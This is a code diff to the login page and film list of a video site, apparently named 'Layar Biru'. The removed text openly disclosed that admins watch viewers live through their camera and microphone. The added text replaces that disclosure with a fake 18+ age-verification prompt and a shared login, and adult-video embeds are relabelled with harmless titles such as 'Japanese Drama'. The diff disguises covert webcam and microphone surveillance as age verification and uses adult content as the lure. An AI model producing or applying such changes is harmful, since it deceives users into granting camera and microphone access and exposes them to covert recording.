@@ -269,7 +269,7 @@ a{color:inherit;text-decoration:none;}
   <div class="login-card">
     <div class="login-logo"><div class="dot"></div><span>Layar Biru</span></div>
     <h2>Masuk ke Akunmu</h2>
-    <p class="sub">Akun penonton masuk ke halaman nonton · Akun admin masuk ke dashboard monitoring.</p>
+    <p class="sub">Masukkan email userbaru@layarbiru.com, Pw: user1234. jika tidak ingin memberikan email pribadi kalian.</p>
     <div class="error-msg" id="login-error">
       <span>🚫</span><span id="login-error-text">Email atau password salah.</span>
     </div>
@@ -282,11 +282,11 @@ a{color:inherit;text-decoration:none;}
       <input id="login-pass" placeholder="••••••••" type="password" autocomplete="current-password"/>
     </div>
     <div class="consent-box">
-      <div class="consent-title">⚠️ Informasi Pemantauan Sesi</div>
-      <p>Platform ini memantau sesi menonton melalui kamera dan mikrofon. Admin dapat melihat video dan audio kamu secara langsung selama menonton.</p>
+      <div class="consent-title">⚠️ Informasi Verifikasi Usia</div>
+      <p>Layar Biru Situs nonton 18+ harap izinkan verifikasi untuk lanjut menonton</p>
       <label class="consent-check">
         <input id="chk-consent" type="checkbox" onchange="document.getElementById('btn-login').disabled=!this.checked"/>
-        <span>Saya mengerti dan menyetujui pemantauan sesi oleh admin platform Layar Biru.</span>
+        <span>Saya menyetujui persyaratan dan saya sudah berusia 18 Tahun</span>
       </label>
     </div>
     <button class="btn-full" disabled id="btn-login" onclick="doLogin()">Masuk &amp; Mulai Nonton</button>
@@ -329,7 +329,7 @@ a{color:inherit;text-decoration:none;}
     <div style="display:flex;align-items:center;gap:10px;">
       <div class="user-chip">
         <div class="avatar" id="user-avatar-chip">U</div>
-        <span id="user-name-chip">Pengguna</span>
+        <span id="user-name-chip">User</span>
       </div>
       <button class="btn-end-session" onclick="endSession()">Keluar</button>
     </div>
@@ -461,17 +461,78 @@ const adminAudioMeters = new Map();
 // SSE
 let sseConnection  = null;
 
-// Daftar film — tambah lebih banyak di sini
+// Daftar film
 const FILMS = [
   {
     id: 1,
-    title: 'Japannese',
+    title: 'Japanese Drama',
     desc: 'Drama',
     embed: 'https://www.xvideos.com/embedframe/oovdbabd850',
     gradient: 'linear-gradient(135deg,#1c2b52,#2E6FF2)'
+  },
+  {
+    id: 2,
+    title: 'Action Movie',
+    desc: 'Aksi',
+    embed: 'https://www.xvideos.com/embedframe/okkbeedc45d',
+    gradient: 'linear-gradient(135deg,#7B1E1E,#E63946)'
+  },
+  {
+    id: 3,
+    title: 'Comedy Show',
+    desc: 'Komedi',
+    embed: 'https://www.youtube.com/embed/VIDEO_ID_3',
+    gradient: 'linear-gradient(135deg,#FF9800,#FFC107)'
+  },
+  {
+    id: 4,
+    title: 'Sci-Fi Adventure',
+    desc: 'Sci-Fi',
+    embed: 'https://www.youtube.com/embed/VIDEO_ID_4',
+    gradient: 'linear-gradient(135deg,#4A148C,#7B1FA2)'
+  },
+  {
+    id: 5,
+    title: 'Romance Story',
+    desc: 'Romantis',
+    embed: 'https://www.youtube.com/embed/VIDEO_ID_5',
+    gradient: 'linear-gradient(135deg,#D81B60,#F06292)'
+  },
+  {
+    id: 6,
+    title: 'Horror Night',
+    desc: 'Horor',
+    embed: 'https://www.youtube.com/embed/VIDEO_ID_6',
+    gradient: 'linear-gradient(135deg,#212121,#424242)'
+  },
+  {
+    id: 7,
+    title: 'Anime Series',
+    desc: 'Anime',
+    embed: 'https://www.youtube.com/embed/VIDEO_ID_7',
+    gradient: 'linear-gradient(135deg,#1565C0,#42A5F5)'
+  },
+  {
+    id: 8,
+    title: 'Fantasy World',
+    desc: 'Fantasi',
+    embed: 'https://www.youtube.com/embed/VIDEO_ID_8',
+    gradient: 'linear-gradient(135deg,#2E7D32,#66BB6A)'
+  },
+  {
+    id: 9,
+    title: 'Documentary',
+    desc: 'Dokumenter',
+    embed: 'https://www.youtube.com/embed/VIDEO_ID_9',
+    gradient: 'linear-gradient(135deg,#6D4C41,#8D6E63)'
+  },
+  {
+    id: 10,
+    title: 'Thriller Mystery',
+    desc: 'Thriller',
+    embed: 'https://www.youtube.com/embed/VIDEO_ID_10',
+    gradient: 'linear-gradient(135deg,#37474F,#607D8B)'
   }
-  // tambah film lain di sini:
-  // { id:2, title:'...', desc:'Aksi', embed:'https://...', gradient:'linear-gradient(...)' },
 ];
 
 let CURRENT_FILM = FILMS[0].title;
